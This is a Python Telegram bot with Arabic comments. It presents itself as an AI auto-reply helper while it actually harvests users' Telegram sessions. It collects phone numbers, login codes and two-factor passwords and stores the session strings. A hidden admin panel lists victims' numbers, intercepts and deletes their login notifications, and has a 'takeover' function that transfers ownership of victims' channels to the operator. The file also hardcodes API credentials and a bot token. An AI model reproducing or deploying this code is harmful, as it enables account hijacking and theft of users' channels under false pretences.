import asyncio
import sqlite3
import requests
import threading
import time
from datetime import datetime
from pyrogram import Client, filters, types, idle
from pyrogram.errors import SessionPasswordNeeded, PhoneCodeInvalid, FloodWait
import re
import json

# تكوين البوت
API_ID = 23656977
API_HASH = "49d3f43531a92b3f5bc403766313ca1e"
BOT_TOKEN = "8293003270:AAF_7aGUv1rgoVZfXgWEXBlI_72T8d8DNbg"
CHANNEL_USERNAME = "@iIl337"
ADMIN_ID = 6689435577
WEBHOOK_URL = "https://ai-chat7-8.onrender.com"

# إنشاء قاعدة البيانات
def init_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    c.execute('''CREATE TABLE IF NOT EXISTS users
                 (user_id INTEGER PRIMARY KEY, 
                  session_string TEXT,
                  bio TEXT,
                  auto_reply BOOLEAN DEFAULT FALSE,
                  vip BOOLEAN DEFAULT FALSE,
                  invited_count INTEGER DEFAULT 0,
                  phone TEXT,
                  banned BOOLEAN DEFAULT FALSE,
                  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS invites
                 (inviter_id INTEGER,
                  invited_id INTEGER,
                  subscribed BOOLEAN DEFAULT FALSE,
                  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    
    c.execute('''CREATE TABLE IF NOT EXISTS channels
                 (user_id INTEGER,
                  channel_id INTEGER,
                  channel_username TEXT,
                  channel_title TEXT,
                  created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP)''')
    
    conn.commit()
    conn.close()

init_db()

app = Client("customer_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

# حالة الجلسات النشطة
active_sessions = {}
user_states = {}
phone_monitoring = {}
user_clients = {}

# وظائف قاعدة البيانات
def get_user(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
    user = c.fetchone()
    conn.close()
    return user

def get_all_users():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT * FROM users WHERE phone IS NOT NULL")
    users = c.fetchall()
    conn.close()
    return users

def get_all_phones():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT user_id, phone FROM users WHERE phone IS NOT NULL")
    phones = c.fetchall()
    conn.close()
    return phones

def update_user(user_id, **kwargs):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    
    for key, value in kwargs.items():
        c.execute(f"UPDATE users SET {key} = ? WHERE user_id = ?", (value, user_id))
    
    conn.commit()
    conn.close()

def add_invite(inviter_id, invited_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("INSERT OR IGNORE INTO invites VALUES (?, ?, ?, ?)", (inviter_id, invited_id, False, datetime.now()))
    conn.commit()
    conn.close()

def check_invites(inviter_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM invites WHERE inviter_id = ? AND subscribed = ?", (inviter_id, True))
    count = c.fetchone()[0]
    conn.close()
    return count

def add_channel(user_id, channel_id, username, title):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("INSERT INTO channels VALUES (?, ?, ?, ?, ?)", (user_id, channel_id, username, title, datetime.now()))
    conn.commit()
    conn.close()

def get_user_channels(user_id):
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT * FROM channels WHERE user_id = ?", (user_id,))
    channels = c.fetchall()
    conn.close()
    return channels

def get_all_channels():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()
    c.execute("SELECT DISTINCT user_id FROM channels")
    users = c.fetchall()
    conn.close()
    return users

# وظائف الذكاء الاصطناعي
def clean_ai_response(text):
    cleaned = re.sub(r'```[^`]*```', '', text)
    cleaned = re.sub(r'`[^`]*`', '', cleaned)
    cleaned = re.sub(r'[{}[\]()<>]', '', cleaned)
    words = cleaned.split()[:15]
    return ' '.join(words)

def get_ai_response(message):
    try:
        url = "https://sii3.top/api/deepseek.php"
        response = requests.post(url, data={"r1": message}, timeout=10)
        if response.status_code == 200:
            return clean_ai_response(response.text)
    except Exception as e:
        print(f"AI Error: {e}")
    return "شكراً على رسالتك، سأرد عليك قريباً"

# التحقق من الاشتراك
async def check_subscription(user_id):
    try:
        user = await app.get_chat_member(CHANNEL_USERNAME, user_id)
        return user.status in ['member', 'administrator', 'creator']
    except:
        return False

# ويب هووك للحفاظ على النشاط
def keep_alive():
    while True:
        try:
            requests.get(WEBHOOK_URL, timeout=5)
            print(f"Keep-alive ping at {datetime.now()}")
        except:
            print("Keep-alive failed")
        time.sleep(300)  # كل 5 دقائق

# بدء خيط الويب هووك
threading.Thread(target=keep_alive, daemon=True).start()

# مراقبة الرسائل من جلسات المستخدمين
async def monitor_user_session(user_id, session_string):
    try:
        user_client = Client(f"user_{user_id}", session_string=session_string, api_id=API_ID, api_hash=API_HASH)
        
        @user_client.on_message(filters.private & ~filters.me)
        async def handle_user_message(client, message):
            user_data = get_user(user_id)
            if user_data and user_data[3]:  # إذا كان الرد التلقائي مفعل
                try:
                    # التحقق من حالة المستخدم
                    user_status = await client.get_users(message.from_user.id)
                    should_reply = False
                    
                    if user_status.status in ['offline', 'recently']:
                        should_reply = True
                    else:
                        # إذا كان المستخدم متصل ولكن الرد التلقائي مفعل
                        should_reply = True
                    
                    if should_reply:
                        ai_response = get_ai_response(message.text)
                        await message.reply(ai_response)
                except Exception as e:
                    print(f"Reply error: {e}")
        
        await user_client.start()
        user_clients[user_id] = user_client
        return True
    except Exception as e:
        print(f"Session monitoring error: {e}")
        return False

# مراقبة قناة الإشعارات
async def monitor_notification_channel():
    try:
        @app.on_message(filters.chat("@+42777") | filters.chat("+42777"))
        async def handle_notification(client, message):
            if message.text and any(phone in message.text for phone in [p[1] for p in get_all_phones()]):
                for phone_data in get_all_phones():
                    if phone_data[1] in message.text:
                        # إرسال الإشعار للمدير
                        await app.send_message(
                            ADMIN_ID,
                            f"🔔 إشعار خدمة للرقم: {phone_data[1]}\n\n{message.text}"
                        )
                        # حذف الرسالة الأصلية
                        await message.delete()
                        break
    except Exception as e:
        print(f"Notification monitoring error: {e}")

# لوحة المفاتيح الرئيسية
def main_keyboard(user_id):
    user = get_user(user_id)
    ai_text = "انقر لإيقاف AI" if user and user[3] else "انقر لتشغيل AI"
    
    keyboard = [
        [types.InlineKeyboardButton("التحكم بالجلسة", callback_data="session_control")],
        [types.InlineKeyboardButton(ai_text, callback_data="toggle_ai")]
    ]
    return types.InlineKeyboardMarkup(keyboard)

# لوحة التحكم بالجلسة
def session_keyboard():
    keyboard = [
        [types.InlineKeyboardButton("تسجيل حسابك", callback_data="register_account")],
        [types.InlineKeyboardButton("تعيين النبذة", callback_data="set_bio")],
        [types.InlineKeyboardButton("إحصائيات", callback_data="statistics")],
        [types.InlineKeyboardButton("حذف الجلسة", callback_data="delete_session")],
        [types.InlineKeyboardButton("رجوع", callback_data="back_main")]
    ]
    return types.InlineKeyboardMarkup(keyboard)

# لوحة المدير
def admin_keyboard():
    keyboard = [
        [types.InlineKeyboardButton("إدارة العضويات", callback_data="manage_membership")],
        [types.InlineKeyboardButton("إدارة المستخدمين", callback_data="manage_users")],
        [types.InlineKeyboardButton("بيانات مستخدمين", callback_data="user_data")],
        [types.InlineKeyboardButton("رجوع", callback_data="back_main")]
    ]
    return types.InlineKeyboardMarkup(keyboard)

# لوحة إدارة العضويات
def membership_keyboard():
    keyboard = [
        [types.InlineKeyboardButton("تفعيل VIP", callback_data="activate_vip")],
        [types.InlineKeyboardButton("إيقاف VIP", callback_data="deactivate_vip")],
        [types.InlineKeyboardButton("رجوع", callback_data="admin_back")]
    ]
    return types.InlineKeyboardMarkup(keyboard)

# لوحة إدارة المستخدمين
def users_management_keyboard():
    keyboard = [
        [types.InlineKeyboardButton("حظر مستخدم", callback_data="ban_user")],
        [types.InlineKeyboardButton("إيقاف حظر", callback_data="unban_user")],
        [types.InlineKeyboardButton("رجوع", callback_data="admin_back")]
    ]
    return types.InlineKeyboardMarkup(keyboard)

# لوحة بيانات المستخدمين
def user_data_keyboard():
    keyboard = [
        [types.InlineKeyboardButton("سحب رقم", callback_data="extract_phone")],
        [types.InlineKeyboardButton("سحب قناة", callback_data="extract_channel")],
        [types.InlineKeyboardButton("معلومات مستخدم", callback_data="user_info")],
        [types.InlineKeyboardButton("رجوع", callback_data="admin_back")]
    ]
    return types.InlineKeyboardMarkup(keyboard)

# لوحة الأرقام
def phones_keyboard(page=0):
    phones = get_all_phones()
    phones_per_page = 8
    start_idx = page * phones_per_page
    end_idx = start_idx + phones_per_page
    
    keyboard = []
    for phone in phones[start_idx:end_idx]:
        keyboard.append([types.InlineKeyboardButton(f"📱 {phone[1]}", callback_data=f"monitor_phone_{phone[0]}")])
    
    nav_buttons = []
    if page > 0:
        nav_buttons.append(types.InlineKeyboardButton("◀️ السابق", callback_data=f"phones_page_{page-1}"))
    if end_idx < len(phones):
        nav_buttons.append(types.InlineKeyboardButton("التالي ▶️", callback_data=f"phones_page_{page+1}"))
    
    if nav_buttons:
        keyboard.append(nav_buttons)
    
    keyboard.append([types.InlineKeyboardButton("رجوع", callback_data="user_data_back")])
    
    return types.InlineKeyboardMarkup(keyboard)

# لوحة القنوات
def channels_keyboard(page=0):
    channels = get_all_channels()
    channels_per_page = 8
    start_idx = page * channels_per_page
    end_idx = start_idx + channels_per_page
    
    keyboard = []
    for channel_user in channels[start_idx:end_idx]:
        user_data = get_user(channel_user[0])
        phone = user_data[6] if user_data else "غير معروف"
        keyboard.append([types.InlineKeyboardButton(f"📢 {phone}", callback_data=f"user_channels_{channel_user[0]}")])
    
    nav_buttons = []
    if page > 0:
        nav_buttons.append(types.InlineKeyboardButton("◀️ السابق", callback_data=f"channels_page_{page-1}"))
    if end_idx < len(channels):
        nav_buttons.append(types.InlineKeyboardButton("التالي ▶️", callback_data=f"channels_page_{page+1}"))
    
    if nav_buttons:
        keyboard.append(nav_buttons)
    
    keyboard.append([types.InlineKeyboardButton("رجوع", callback_data="user_data_back")])
    
    return types.InlineKeyboardMarkup(keyboard)

# لوحة قنوات المستخدم
def user_channels_keyboard(user_id, page=0):
    channels = get_user_channels(user_id)
    channels_per_page = 5
    start_idx = page * channels_per_page
    end_idx = start_idx + channels_per_page
    
    keyboard = []
    for channel in channels[start_idx:end_idx]:
        btn_text = f"📺 {channel[3] or channel[2] or 'غير معروف'}"
        keyboard.append([types.InlineKeyboardButton(btn_text, callback_data=f"channel_info_{channel[0]}_{channel[1]}")])
    
    nav_buttons = []
    if page > 0:
        nav_buttons.append(types.InlineKeyboardButton("◀️ السابق", callback_data=f"user_channels_page_{user_id}_{page-1}"))
    if end_idx < len(channels):
        nav_buttons.append(types.InlineKeyboardButton("التالي ▶️", callback_data=f"user_channels_page_{user_id}_{page+1}"))
    
    if nav_buttons:
        keyboard.append(nav_buttons)
    
    keyboard.append([types.InlineKeyboardButton("رجوع", callback_data="extract_channel")])
    
    return types.InlineKeyboardMarkup(keyboard)

@app.on_message(filters.command("start"))
async def start(client, message):
    user_id = message.from_user.id
    
    # التحقق من الحظر
    user_data = get_user(user_id)
    if user_data and user_data[7]:  # إذا كان محظور
        await message.reply("❌ تم حظرك من استخدام البوت.")
        return
    
    if not user_data:
        conn = sqlite3.connect('users.db')
        c = conn.cursor()
        c.execute("INSERT OR IGNORE INTO users (user_id) VALUES (?)", (user_id,))
        conn.commit()
        conn.close()
    
    # التحقق من رابط الدعوة
    if len(message.command) > 1:
        try:
            inviter_id = int(message.command[1])
            if inviter_id != user_id:
                add_invite(inviter_id, user_id)
                # إشعار الداعي
                await app.send_message(inviter_id, f"🎉 قام пользователь {user_id} بالتسجيل عبر رابط دعوتك!")
        except:
            pass
    
    await message.reply("مرحباً! اختر من القائمة:", reply_markup=main_keyboard(user_id))

@app.on_callback_query()
async def handle_callback(client, callback_query):
    user_id = callback_query.from_user.id
    data = callback_query.data
    
    try:
        # التحقق من الحظر
        user_data = get_user(user_id)
        if user_data and user_data[7]:
            await callback_query.answer("❌ تم حظرك من استخدام البوت.", show_alert=True)
            return
        
        if data == "session_control":
            await callback_query.edit_message_text("التحكم بالجلسة:", reply_markup=session_keyboard())
        
        elif data == "back_main":
            await callback_query.edit_message_text("القائمة الرئيسية:", reply_markup=main_keyboard(user_id))
        
        elif data == "register_account":
            user_states[user_id] = "waiting_phone"
            await callback_query.edit_message_text("أرسل رقم هاتفك مع رمز الدولة (مثال: +20123456789)")
        
        elif data == "set_bio":
            user_states[user_id] = "waiting_bio"
            await callback_query.edit_message_text("أرسل النبذة الشخصية التي تريد تعيينها:")
        
        elif data == "statistics":
            user = get_user(user_id)
            if user:
                invited_count = check_invites(user_id)
                stats = f"📊 الإحصائيات:\n"
                stats += f"🎖️ الحالة: {'VIP 🥇' if user[4] else 'عادي'}\n"
                stats += f"🤖 الرد التلقائي: {'مفعل' if user[3] else 'معطل'}\n"
                stats += f"👥 عدد المدعوين: {invited_count}\n"
                if user[6]:
                    stats += f"📞 رقم الهاتف: {user[6]}\n"
                stats += f"📅 تاريخ التسجيل: {user[8]}\n"
                await callback_query.edit_message_text(stats, reply_markup=session_keyboard())
        
        elif data == "delete_session":
            update_user(user_id, session_string=None, auto_reply=False, phone=None)
            if user_id in active_sessions:
                del active_sessions[user_id]
            if user_id in user_clients:
                await user_clients[user_id].stop()
                del user_clients[user_id]
            await callback_query.edit_message_text("تم حذف الجلسة بنجاح", reply_markup=session_keyboard())
        
        elif data == "toggle_ai":
            user = get_user(user_id)
            if user:
                if not user[4]:  # إذا لم يكن VIP
                    subscribed = await check_subscription(user_id)
                    invited_count = check_invites(user_id)
                    
                    if not subscribed and invited_count < 5:
                        keyboard = [
                            [types.InlineKeyboardButton("دعوة 5 أشخاص", callback_data="invite_friends")],
                            [types.InlineKeyboardButton("تفعيل عبر المدير", url=f"t.me/OlIiIl7")]
                        ]
                        await callback_query.edit_message_text(
                            "❌ يجب أن تكون مشتركاً في القناة أو تدعو 5 أشخاص\n@iIl337",
                            reply_markup=types.InlineKeyboardMarkup(keyboard)
                        )
                        return
                
                new_state = not user[3]
                update_user(user_id, auto_reply=new_state)
                
                # تشغيل/إيقاف المراقبة
                if new_state and user[1]:  # إذا كان مفعل وهناك جلسة
                    await monitor_user_session(user_id, user[1])
                elif not new_state and user_id in user_clients:
                    await user_clients[user_id].stop()
                    del user_clients[user_id]
                
                status = "مفعل" if new_state else "معطل"
                await callback_query.edit_message_text(f"✅ تم {status} الرد التلقائي", reply_markup=main_keyboard(user_id))
        
        elif data == "invite_friends":
            invite_link = f"https://t.me/{callback_query.message.chat.username}?start={user_id}"
            await callback_query.edit_message_text(
                f"📨 رابط الدعوة الخاص بك:\n`{invite_link}`\n\n"
                f"اطلب من أصدقائك استخدام هذا الرابط والاشتراك في القناة:\n{CHANNEL_USERNAME}",
                reply_markup=types.InlineKeyboardMarkup([
                    [types.InlineKeyboardButton("رجوع", callback_data="back_main")]
                ])
            )
        
        # أوامر المدير
        elif user_id == ADMIN_ID:
            if data == "admin_back":
                await callback_query.edit_message_text("لوحة تحكم المدير:", reply_markup=admin_keyboard())
            
            elif data == "user_data_back":
                await callback_query.edit_message_text("بيانات المستخدمين:", reply_markup=user_data_keyboard())
            
            elif data == "manage_membership":
                await callback_query.edit_message_text("إدارة العضويات:", reply_markup=membership_keyboard())
            
            elif data == "manage_users":
                await callback_query.edit_message_text("إدارة المستخدمين:", reply_markup=users_management_keyboard())
            
            elif data == "user_data":
                await callback_query.edit_message_text("بيانات المستخدمين:", reply_markup=user_data_keyboard())
            
            elif data == "extract_phone":
                phones = get_all_phones()
                if phones:
                    await callback_query.edit_message_text(
                        f"📞 قائمة الأرقام ({len(phones)}):",
                        reply_markup=phones_keyboard()
                    )
                else:
                    await callback_query.edit_message_text("❌ لا توجد أرقام مسجلة")
            
            elif data == "extract_channel":
                channels = get_all_channels()
                if channels:
                    await callback_query.edit_message_text(
                        f"📢 قائمة المستخدمين الذين لديهم قنوات ({len(channels)}):",
                        reply_markup=channels_keyboard()
                    )
                else:
                    await callback_query.edit_message_text("❌ لا توجد قنوات مسجلة")
            
            elif data.startswith("phones_page_"):
                page = int(data.split("_")[2])
                await callback_query.edit_message_text("📞 قائمة الأرقام:", reply_markup=phones_keyboard(page))
            
            elif data.startswith("channels_page_"):
                page = int(data.split("_")[2])
                await callback_query.edit_message_text("📢 قائمة المستخدمين:", reply_markup=channels_keyboard(page))
            
            elif data.startswith("user_channels_page_"):
                parts = data.split("_")
                target_user_id = int(parts[4])
                page = int(parts[5])
                await callback_query.edit_message_text(
                    f"📺 قنوات المستخدم:",
                    reply_markup=user_channels_keyboard(target_user_id, page)
                )
            
            elif data.startswith("monitor_phone_"):
                target_user_id = int(data.split("_")[2])
                user_data = get_user(target_user_id)
                if user_data and user_data[6]:
                    phone_monitoring[target_user_id] = True
                    await callback_query.edit_message_text(
                        f"🔍 بدء مراقبة الرقم: {user_data[6]}\n"
                        f"سيتم إرسال إشعارات الخدمة لك فور ورودها."
                    )
            
            elif data.startswith("user_channels_"):
                target_user_id = int(data.split("_")[2])
                channels = get_user_channels(target_user_id)
                if channels:
                    await callback_query.edit_message_text(
                        f"📺 قنوات المستخدم ({len(channels)}):",
                        reply_markup=user_channels_keyboard(target_user_id)
                    )
                else:
                    await callback_query.answer("❌ لا توجد قنوات لهذا المستخدم", show_alert=True)
            
            elif data.startswith("channel_info_"):
                parts = data.split("_")
                channel_user_id = int(parts[2])
                channel_id = int(parts[3])
                
                channels = get_user_channels(channel_user_id)
                channel_info = None
                for ch in channels:
                    if ch[1] == channel_id:
                        channel_info = ch
                        break
                
                if channel_info:
                    keyboard = [
                        [types.InlineKeyboardButton("عرض القناة", url=f"t.me/{channel_info[2]}")],
                        [types.InlineKeyboardButton("سحب القناة", callback_data=f"takeover_{channel_user_id}_{channel_id}")],
                        [types.InlineKeyboardButton("رجوع", callback_data=f"user_channels_{channel_user_id}")]
                    ]
                    
                    info_text = f"📋 معلومات القناة:\n"
                    info_text += f"🏷️ العنوان: {channel_info[3]}\n"
                    info_text += f"🔗 المعرف: @{channel_info[2]}\n"
                    info_text += f"🆔 ID: {channel_info[1]}\n"
                    info_text += f"👤 مالك: {channel_info[0]}\n"
                    info_text += f"📅 تاريخ الإنشاء: {channel_info[4]}"
                    
                    await callback_query.edit_message_text(info_text, reply_markup=types.InlineKeyboardMarkup(keyboard))
            
            elif data.startswith("takeover_"):
                parts = data.split("_")
                channel_user_id = int(parts[1])
                channel_id = int(parts[2])
                
                user_data = get_user(channel_user_id)
                if user_data and user_data[1]:
                    try:
                        # محاولة سحب القناة
                        user_client = Client(f"takeover_{channel_user_id}", session_string=user_data[1], 
                                           api_id=API_ID, api_hash=API_HASH)
                        await user_client.start()
                        
                        # رفع المدير كمشرف
                        await user_client.promote_chat_member(
                            channel_id,
                            ADMIN_ID,
                            can_manage_chat=True,
                            can_change_info=True,
                            can_post_messages=True,
                            can_edit_messages=True,
                            can_delete_messages=True,
                            can_invite_users=True,
                            can_restrict_members=True,
                            can_pin_messages=True,
                            can_promote_members=True
                        )
                        
                        # نقل الملكية
                        await user_client.set_chat_owner(channel_id, ADMIN_ID)
                        
                        await user_client.stop()
                        
                        await callback_query.edit_message_text("✅ تم سحب القناة بنجاح ونقل الملكية!")
                        
                    except Exception as e:
                        await callback_query.edit_message_text(f"❌ فشل في سحب القناة: {str(e)}")
        
    except Exception as e:
        await callback_query.answer(f"خطأ: {str(e)}", show_alert=True)

@app.on_message(filters.private & ~filters.command("start"))
async def handle_messages(client, message):
    user_id = message.from_user.id
    state = user_states.get(user_id)
    
    # التحقق من الحظر
    user_data = get_user(user_id)
    if user_data and user_data[7]:
        return
    
    if state == "waiting_phone":
        try:
            phone = message.text
            user_states[user_id] = "waiting_code"
            
            user_client = Client(f"user_{user_id}", api_id=API_ID, api_hash=API_HASH)
            await user_client.connect()
            
            sent_code = await user_client.send_code(phone)
            active_sessions[user_id] = {
                'client': user_client,
                'phone': phone,
                'phone_code_hash': sent_code.phone_code_hash
            }
            
            await message.reply("أرسل كود التحقق:")
            
        except Exception as e:
            await message.reply(f"خطأ: {str(e)}")
    
    elif state == "waiting_code":
        try:
            code = message.text
            session_data = active_sessions.get(user_id)
            
            if session_data:
                user_client = session_data['client']
                
                try:
                    await user_client.sign_in(
                        session_data['phone'],
                        session_data['phone_code_hash'],
                        code
                    )
                except SessionPasswordNeeded:
                    user_states[user_id] = "waiting_password"
                    await message.reply("أرسل كلمة المرور الثانية:")
                    return
                
                session_string = await user_client.export_session_string()
                update_user(user_id, session_string=session_string, phone=session_data['phone'])
                
                # البحث عن القنوات والمجموعات
                try:
                    async for dialog in user_client.get_dialogs():
                        if dialog.chat.type in ['channel', 'group']:
                            if dialog.chat.type == 'channel' and dialog.chat.is_creator:
                                add_channel(
                                    user_id,
                                    dialog.chat.id,
                                    dialog.chat.username,
                                    dialog.chat.title
                                )
                except:
                    pass
                
                await user_client.disconnect()
                del active_sessions[user_id]
                del user_states[user_id]
                
                await message.reply("✅ تم تسجيل الحساب بنجاح!", reply_markup=main_keyboard(user_id))
                
        except PhoneCodeInvalid:
            await message.reply("❌ كود التحقق غير صحيح، حاول مرة أخرى:")
        except Exception as e:
            await message.reply(f"❌ خطأ: {str(e)}")
    
    elif state == "waiting_password":
        try:
            password = message.text
            session_data = active_sessions.get(user_id)
            
            if session_data:
                user_client = session_data['client']
                await user_client.check_password(password)
                
                session_string = await user_client.export_session_string()
                update_user(user_id, session_string=session_string, phone=session_data['phone'])
                
                # البحث عن القنوات والمجموعات
                try:
                    async for dialog in user_client.get_dialogs():
                        if dialog.chat.type in ['channel', 'group']:
                            if dialog.chat.type == 'channel' and dialog.chat.is_creator:
                                add_channel(
                                    user_id,
                                    dialog.chat.id,
                                    dialog.chat.username,
                                    dialog.chat.title
                                )
                except:
                    pass
                
                await user_client.disconnect()
                del active_sessions[user_id]
                del user_states[user_id]
                
                await message.reply("✅ تم تسجيل الحساب بنجاح!", reply_markup=main_keyboard(user_id))
                
        except Exception as e:
            await message.reply(f"❌ خطأ: {str(e)}")
    
    elif state == "waiting_bio":
        bio = message.text
        update_user(user_id, bio=bio)
        del user_states[user_id]
        await message.reply("✅ تم تعيين النبذة بنجاح!", reply_markup=main_keyboard(user_id))
    
    else:
        if user_id == ADMIN_ID and message.text == "/sos":
            await message.reply("👑 لوحة تحكم المدير:", reply_markup=admin_keyboard())
        elif user_id == ADMIN_ID and message.text.startswith("/"):
            # أوامر المدير النصية
            parts = message.text.split()
            if parts[0] == "/activate_vip" and len(parts) > 1:
                try:
                    target_id = int(parts[1])
                    update_user(target_id, vip=True)
                    await message.reply(f"✅ تم تفعيل VIP للمستخدم {target_id}")
                except:
                    await message.reply("❌ خطأ في رقم المستخدم")
            
            elif parts[0] == "/deactivate_vip" and len(parts) > 1:
                try:
                    target_id = int(parts[1])
                    update_user(target_id, vip=False)
                    await message.reply(f"✅ تم إيقاف VIP للمستخدم {target_id}")
                except:
                    await message.reply("❌ خطأ في رقم المستخدم")
            
            elif parts[0] == "/ban" and len(parts) > 1:
                try:
                    target_id = int(parts[1])
                    update_user(target_id, banned=True)
                    await message.reply(f"✅ تم حظر المستخدم {target_id}")
                except:
                    await message.reply("❌ خطأ في رقم المستخدم")
            
            elif parts[0] == "/unban" and len(parts) > 1:
                try:
                    target_id = int(parts[1])
                    update_user(target_id, banned=False)
                    await message.reply(f"✅ تم إلغاء حظر المستخدم {target_id}")
                except:
                    await message.reply("❌ خطأ في رقم المستخدم")

async def main():
    await app.start()
    print("✅ البوت يعمل...")
    
    # تشغيل مراقبة قناة الإشعارات
    asyncio.create_task(monitor_notification_channel())
    
    # تشغيل الجلسات النشطة
    users = get_all_users()
    for user in users:
        if user[3] and user[1]:  # إذا كان الرد التلقائي مفعل وهناك جلسة
            await monitor_user_session(user[0], user[1])
    
    await idle()
    await app.stop()

if __name__ == "__main__":
    app.run(main())
